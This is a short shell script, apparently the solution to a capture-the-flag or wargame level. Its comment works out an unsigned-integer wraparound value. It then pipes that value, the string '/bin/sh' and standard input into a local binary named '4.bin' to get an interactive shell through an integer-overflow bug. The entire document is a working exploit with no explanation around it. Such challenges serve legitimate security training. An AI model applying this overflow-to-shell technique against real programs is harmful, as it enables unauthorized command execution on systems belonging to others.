#!/bin/sh

# ((unsigned int)-64) >> 1 == 2147483616

{ echo 2147483616 ; echo /bin/sh ; cat - ; } | ./4.bin

